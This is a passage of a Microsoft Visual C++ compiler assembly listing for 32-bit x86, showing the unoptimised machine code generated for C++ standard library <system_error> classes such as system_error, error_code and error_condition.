  00023	8b 55 0c	 mov	 edx, DWORD PTR __Errcode$[ebp+4]
  00026	52		 push	 edx
  00027	8b 45 08	 mov	 eax, DWORD PTR __Errcode$[ebp]
  0002a	50		 push	 eax
  0002b	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  0002e	e8 00 00 00 00	 call	 ??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_System_error::_System_error
  00033	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00036	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  0003b	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  0003e	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7system_error@std@@6B@
  00044	8b 45 e0	 mov	 eax, DWORD PTR _this$[ebp]
  00047	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0004a	33 cd		 xor	 ecx, ebp
  0004c	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00051	8b e5		 mov	 esp, ebp
  00053	5d		 pop	 ebp
  00054	c2 0c 00	 ret	 12			; 0000000cH
??0system_error@std@@QAE@Verror_code@1@PBD@Z ENDP	; std::system_error::system_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0system_error@std@@QAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Errcode$ = 8						; size = 8
__Message$ = 16						; size = 4
??0system_error@std@@QAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::system_error::system_error, COMDAT
; _this$ = ecx

; 496  :     system_error(error_code _Errcode, const string& _Message) : _Mybase(_Errcode, _Message) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 10	 mov	 eax, DWORD PTR __Message$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 0c	 mov	 ecx, DWORD PTR __Errcode$[ebp+4]
  0000e	51		 push	 ecx
  0000f	8b 55 08	 mov	 edx, DWORD PTR __Errcode$[ebp]
  00012	52		 push	 edx
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_System_error::_System_error
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7system_error@std@@6B@
  00024	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c2 0c 00	 ret	 12			; 0000000cH
??0system_error@std@@QAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::system_error::system_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0system_error@std@@QAE@Verror_code@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Errcode$ = 8						; size = 8
??0system_error@std@@QAE@Verror_code@1@@Z PROC		; std::system_error::system_error, COMDAT
; _this$ = ecx

; 494  :     system_error(error_code _Errcode) : _Mybase(_Errcode) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR __Errcode$[ebp+4]
  0000a	50		 push	 eax
  0000b	8b 4d 08	 mov	 ecx, DWORD PTR __Errcode$[ebp]
  0000e	51		 push	 ecx
  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ??0_System_error@std@@IAE@Verror_code@1@@Z ; std::_System_error::_System_error
  00017	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0001a	c7 02 00 00 00
	00		 mov	 DWORD PTR [edx], OFFSET ??_7system_error@std@@6B@
  00020	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00023	8b e5		 mov	 esp, ebp
  00025	5d		 pop	 ebp
  00026	c2 08 00	 ret	 8
??0system_error@std@@QAE@Verror_code@1@@Z ENDP		; std::system_error::system_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G_System_error@std@@UAEPAXI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___flags$ = 8						; size = 4
??_G_System_error@std@@UAEPAXI@Z PROC			; std::_System_error::`scalar deleting destructor', COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_System_error@std@@UAE@XZ
  0000f	8b 45 08	 mov	 eax, DWORD PTR ___flags$[ebp]
  00012	83 e0 01	 and	 eax, 1
  00015	74 0e		 je	 SHORT $LN2@scalar
  00017	6a 14		 push	 20			; 00000014H
  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	51		 push	 ecx
  0001d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
  00022	83 c4 08	 add	 esp, 8
$LN2@scalar:
  00025	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00028	8b e5		 mov	 esp, ebp
  0002a	5d		 pop	 ebp
  0002b	c2 04 00	 ret	 4
??_G_System_error@std@@UAEPAXI@Z ENDP			; std::_System_error::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0_System_error@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0_System_error@std@@QAE@ABV01@@Z PROC			; std::_System_error::_System_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 08	 mov	 eax, DWORD PTR ___that$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0runtime_error@std@@QAE@ABV01@@Z
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7_System_error@std@@6B@
  0001c	8b 55 08	 mov	 edx, DWORD PTR ___that$[ebp]
  0001f	8b 42 0c	 mov	 eax, DWORD PTR [edx+12]
  00022	8b 4a 10	 mov	 ecx, DWORD PTR [edx+16]
  00025	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00028	89 42 0c	 mov	 DWORD PTR [edx+12], eax
  0002b	89 4a 10	 mov	 DWORD PTR [edx+16], ecx
  0002e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c2 04 00	 ret	 4
??0_System_error@std@@QAE@ABV01@@Z ENDP			; std::_System_error::_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1_System_error@std@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_System_error@std@@UAE@XZ PROC			; std::_System_error::~_System_error, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1runtime_error@std@@UAE@XZ
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1_System_error@std@@UAE@XZ ENDP			; std::_System_error::~_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
_this$ = -32						; size = 4
$T1 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
__Errcode$ = 8						; size = 8
__Message$ = 16						; size = 4
??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_System_error::_System_error, COMDAT
; _this$ = ecx

; 483  :     _System_error(error_code _Errcode, const string& _Message)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 20	 sub	 esp, 32			; 00000020H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	89 4d e0	 mov	 DWORD PTR _this$[ebp], ecx

; 484  :         : runtime_error(_Makestr(_Errcode, _Message)), _Mycode(_Errcode) {}

  00013	83 ec 18	 sub	 esp, 24			; 00000018H
  00016	8b cc		 mov	 ecx, esp
  00018	8b 45 10	 mov	 eax, DWORD PTR __Message$[ebp]
  0001b	50		 push	 eax
  0001c	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00021	8b 4d 0c	 mov	 ecx, DWORD PTR __Errcode$[ebp+4]
  00024	51		 push	 ecx
  00025	8b 55 08	 mov	 edx, DWORD PTR __Errcode$[ebp]
  00028	52		 push	 edx
  00029	8d 45 e4	 lea	 eax, DWORD PTR $T1[ebp]
  0002c	50		 push	 eax
  0002d	e8 00 00 00 00	 call	 ?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ; std::_System_error::_Makestr
  00032	83 c4 24	 add	 esp, 36			; 00000024H
  00035	50		 push	 eax
  00036	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00039	e8 00 00 00 00	 call	 ??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::runtime_error::runtime_error
  0003e	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00041	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  00046	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00049	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7_System_error@std@@6B@
  0004f	8b 55 e0	 mov	 edx, DWORD PTR _this$[ebp]
  00052	8b 45 08	 mov	 eax, DWORD PTR __Errcode$[ebp]
  00055	8b 4d 0c	 mov	 ecx, DWORD PTR __Errcode$[ebp+4]
  00058	89 42 0c	 mov	 DWORD PTR [edx+12], eax
  0005b	89 4a 10	 mov	 DWORD PTR [edx+16], ecx
  0005e	8b 45 e0	 mov	 eax, DWORD PTR _this$[ebp]
  00061	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00064	33 cd		 xor	 ecx, ebp
  00066	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0006b	8b e5		 mov	 esp, ebp
  0006d	5d		 pop	 ebp
  0006e	c2 0c 00	 ret	 12			; 0000000cH
??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_System_error::_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0_System_error@std@@IAE@Verror_code@1@@Z
_TEXT	SEGMENT
_this$ = -32						; size = 4
$T1 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
__Errcode$ = 8						; size = 8
??0_System_error@std@@IAE@Verror_code@1@@Z PROC		; std::_System_error::_System_error, COMDAT
; _this$ = ecx

; 481  :     _System_error(error_code _Errcode) : runtime_error(_Errcode.message()), _Mycode(_Errcode) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 20	 sub	 esp, 32			; 00000020H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	89 4d e0	 mov	 DWORD PTR _this$[ebp], ecx
  00013	8d 45 e4	 lea	 eax, DWORD PTR $T1[ebp]
  00016	50		 push	 eax
  00017	8d 4d 08	 lea	 ecx, DWORD PTR __Errcode$[ebp]
  0001a	e8 00 00 00 00	 call	 ?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::error_code::message
  0001f	50		 push	 eax
  00020	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ??0runtime_error@std@@QAE@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::runtime_error::runtime_error
  00028	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  0002b	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  00030	8b 4d e0	 mov	 ecx, DWORD PTR _this$[ebp]
  00033	c7 01 00 00 00
	00		 mov	 DWORD PTR [ecx], OFFSET ??_7_System_error@std@@6B@
  00039	8b 55 e0	 mov	 edx, DWORD PTR _this$[ebp]
  0003c	8b 45 08	 mov	 eax, DWORD PTR __Errcode$[ebp]
  0003f	8b 4d 0c	 mov	 ecx, DWORD PTR __Errcode$[ebp+4]
  00042	89 42 0c	 mov	 DWORD PTR [edx+12], eax
  00045	89 4a 10	 mov	 DWORD PTR [edx+16], ecx
  00048	8b 45 e0	 mov	 eax, DWORD PTR _this$[ebp]
  0004b	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  0004e	33 cd		 xor	 ecx, ebp
  00050	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00055	8b e5		 mov	 esp, ebp
  00057	5d		 pop	 ebp
  00058	c2 08 00	 ret	 8
??0_System_error@std@@IAE@Verror_code@1@@Z ENDP		; std::_System_error::_System_error
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
_TEXT	SEGMENT
$T1 = -28						; size = 24
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
__Errcode$ = 12						; size = 8
__Message$ = 20						; size = 24
?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z PROC ; std::_System_error::_Makestr, COMDAT

; 471  :     static string _Makestr(error_code _Errcode, string _Message) { // compose error message

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 1c	 sub	 esp, 28			; 0000001cH
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 472  :         if (!_Message.empty()) {

  00010	8d 4d 14	 lea	 ecx, DWORD PTR __Message$[ebp]
  00013	e8 00 00 00 00	 call	 ?empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE_NXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::empty
  00018	0f b6 c0	 movzx	 eax, al
  0001b	85 c0		 test	 eax, eax
  0001d	75 0d		 jne	 SHORT $LN2@Makestr

; 473  :             _Message.append(": ");

  0001f	68 00 00 00 00	 push	 OFFSET ??_C@_02LMMGGCAJ@?3?5@
  00024	8d 4d 14	 lea	 ecx, DWORD PTR __Message$[ebp]
  00027	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
$LN2@Makestr:

; 474  :         }
; 475  : 
; 476  :         _Message.append(_Errcode.message());

  0002c	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  0002f	51		 push	 ecx
  00030	8d 4d 0c	 lea	 ecx, DWORD PTR __Errcode$[ebp]
  00033	e8 00 00 00 00	 call	 ?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::error_code::message
  00038	50		 push	 eax
  00039	8d 4d 14	 lea	 ecx, DWORD PTR __Message$[ebp]
  0003c	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append
  00041	8d 4d e4	 lea	 ecx, DWORD PTR $T1[ebp]
  00044	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >

; 477  :         return _Message;

  00049	8d 55 14	 lea	 edx, DWORD PTR __Message$[ebp]
  0004c	52		 push	 edx
  0004d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00050	e8 00 00 00 00	 call	 ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@$$QAV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
  00055	8d 4d 14	 lea	 ecx, DWORD PTR __Message$[ebp]
  00058	e8 00 00 00 00	 call	 ??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
  0005d	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 478  :     }

  00060	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00063	33 cd		 xor	 ecx, ebp
  00065	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0006a	8b e5		 mov	 esp, ebp
  0006c	5d		 pop	 ebp
  0006d	c3		 ret	 0
?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z ENDP ; std::_System_error::_Makestr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Ec$ = 12						; size = 4
?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z PROC ; std::make_error_code, COMDAT

; 437  : _EXPORT_STD _NODISCARD inline error_code make_error_code(io_errc _Ec) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 438  :     return error_code(static_cast<int>(_Ec), _STD iostream_category());

  00003	e8 00 00 00 00	 call	 ?iostream_category@std@@YAABVerror_category@1@XZ ; std::iostream_category
  00008	50		 push	 eax
  00009	8b 45 0c	 mov	 eax, DWORD PTR __Ec$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00010	e8 00 00 00 00	 call	 ??0error_code@std@@QAE@HABVerror_category@1@@Z ; std::error_code::error_code
  00015	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 439  : }

  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ENDP ; std::make_error_code
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?make_error_code@std@@YA?AVerror_code@1@W4errc@1@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Ec$ = 12						; size = 4
?make_error_code@std@@YA?AVerror_code@1@W4errc@1@@Z PROC ; std::make_error_code, COMDAT

; 433  : _EXPORT_STD _NODISCARD inline error_code make_error_code(errc _Ec) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 434  :     return error_code(static_cast<int>(_Ec), _STD generic_category());

  00003	e8 00 00 00 00	 call	 ?generic_category@std@@YAABVerror_category@1@XZ ; std::generic_category
  00008	50		 push	 eax
  00009	8b 45 0c	 mov	 eax, DWORD PTR __Ec$[ebp]
  0000c	50		 push	 eax
  0000d	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00010	e8 00 00 00 00	 call	 ??0error_code@std@@QAE@HABVerror_category@1@@Z ; std::error_code::error_code
  00015	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 435  : }

  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?make_error_code@std@@YA?AVerror_code@1@W4errc@1@@Z ENDP ; std::make_error_code
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??8std@@YA_NABVerror_condition@0@0@Z
_TEXT	SEGMENT
tv74 = -12						; size = 4
tv72 = -8						; size = 4
tv82 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??8std@@YA_NABVerror_condition@0@0@Z PROC		; std::operator==, COMDAT

; 308  :     _NODISCARD_FRIEND bool operator==(const error_condition& _Left, const error_condition& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	56		 push	 esi

; 309  :         return _Left.category() == _Right.category() && _Left.value() == _Right.value();

  00007	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000a	e8 00 00 00 00	 call	 ?category@error_condition@std@@QBEABVerror_category@2@XZ ; std::error_condition::category
  0000f	89 45 f4	 mov	 DWORD PTR tv74[ebp], eax
  00012	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00015	e8 00 00 00 00	 call	 ?category@error_condition@std@@QBEABVerror_category@2@XZ ; std::error_condition::category
  0001a	89 45 f8	 mov	 DWORD PTR tv72[ebp], eax
  0001d	8b 45 f8	 mov	 eax, DWORD PTR tv72[ebp]
  00020	50		 push	 eax
  00021	8b 4d f4	 mov	 ecx, DWORD PTR tv74[ebp]
  00024	e8 00 00 00 00	 call	 ??8error_category@std@@QBE_NABV01@@Z ; std::error_category::operator==
  00029	0f b6 c8	 movzx	 ecx, al
  0002c	85 c9		 test	 ecx, ecx
  0002e	74 1f		 je	 SHORT $LN3@operator
  00030	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  00033	e8 00 00 00 00	 call	 ?value@error_condition@std@@QBEHXZ ; std::error_condition::value
  00038	8b f0		 mov	 esi, eax
  0003a	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  0003d	e8 00 00 00 00	 call	 ?value@error_condition@std@@QBEHXZ ; std::error_condition::value
  00042	3b f0		 cmp	 esi, eax
  00044	75 09		 jne	 SHORT $LN3@operator
  00046	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv82[ebp], 1
  0004d	eb 07		 jmp	 SHORT $LN4@operator
$LN3@operator:
  0004f	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv82[ebp], 0
$LN4@operator:
  00056	0f b6 45 fc	 movzx	 eax, BYTE PTR tv82[ebp]

; 310  :     }

  0005a	5e		 pop	 esi
  0005b	8b e5		 mov	 esp, ebp
  0005d	5d		 pop	 ebp
  0005e	c3		 ret	 0
??8std@@YA_NABVerror_condition@0@0@Z ENDP		; std::operator==
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?category@error_condition@std@@QBEABVerror_category@2@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?category@error_condition@std@@QBEABVerror_category@2@XZ PROC ; std::error_condition::category, COMDAT
; _this$ = ecx

; 295  :     _NODISCARD const error_category& category() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 296  :         return *_Mycat;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 04	 mov	 eax, DWORD PTR [eax+4]

; 297  :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?category@error_condition@std@@QBEABVerror_category@2@XZ ENDP ; std::error_condition::category
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?value@error_condition@std@@QBEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?value@error_condition@std@@QBEHXZ PROC			; std::error_condition::value, COMDAT
; _this$ = ecx

; 291  :     _NODISCARD int value() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 292  :         return _Myval;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 00		 mov	 eax, DWORD PTR [eax]

; 293  :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?value@error_condition@std@@QBEHXZ ENDP			; std::error_condition::value
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ??0error_condition@std@@QAE@HABVerror_category@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Val$ = 8						; size = 4
__Cat$ = 12						; size = 4
??0error_condition@std@@QAE@HABVerror_category@1@@Z PROC ; std::error_condition::error_condition, COMDAT
; _this$ = ecx

; 266  :     error_condition(int _Val, const error_category& _Cat) noexcept : _Myval(_Val), _Mycat(&_Cat) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Val$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx
  0000f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Cat$[ebp]
  00015	89 42 04	 mov	 DWORD PTR [edx+4], eax
  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 08 00	 ret	 8
??0error_condition@std@@QAE@HABVerror_category@1@@Z ENDP ; std::error_condition::error_condition
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\system_error
;	COMDAT ?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
_TEXT	SEGMENT
tv78 = -16						; size = 4
tv76 = -12						; size = 4
tv67 = -8						; size = 4
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?message@error_code@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ PROC ; std::error_code::message, COMDAT
; _this$ = ecx

; 208  :     _NODISCARD string message() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 209  :         return category().message(value());

